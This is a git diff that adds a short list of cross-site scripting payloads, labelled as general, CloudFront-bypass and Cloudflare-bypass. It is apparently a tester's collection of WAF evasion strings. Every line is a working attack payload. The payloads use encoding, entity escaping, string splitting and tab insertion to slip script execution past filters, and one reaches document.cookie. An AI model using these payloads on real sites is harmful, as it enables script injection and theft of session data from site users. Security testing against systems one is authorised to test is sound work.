@@ -1,0 +1,13 @@
+# general
+["');alert('XSS');//"]@xyz.xxx
+
+# cloudfront
+">%0D%0A%0D%0A<x '="foo"><x foo='><img src=x onerror=javascript:alert(cloudfrontbypass)//'>
+
+# cloudflare
+"%2Bself[%2F*foo*%2F'alert'%2F*bar*%2F](self[%2F*foo*%2F'document'%2F*bar*%2F]['domain'])%2F%2F
+"&gt;&lt;BODy onbeforescriptexecute="x1='cookie';c=')';b='a';location='jav'+b+'script:con'+'fir\u006d('+'document'+'.'+x1+c"&gt;
+"><BODy onbeforescriptexecute="x1='cookie';c=')';b='a';location='jav'+b+'script:con'+'fir\u006d('+'document'+'.'+x1+c">
+&lt;--&lt;img/src=%20onerror=confirm``&gt;%20--!&gt;
+&lt;iframe src=java&amp;Tab;sc&amp;Tab;ript:al&amp;Tab;ert()&gt;&lt;/iframe&gt;
+&lt;sVg/onLy=1 onLoaD=confirm(1)//
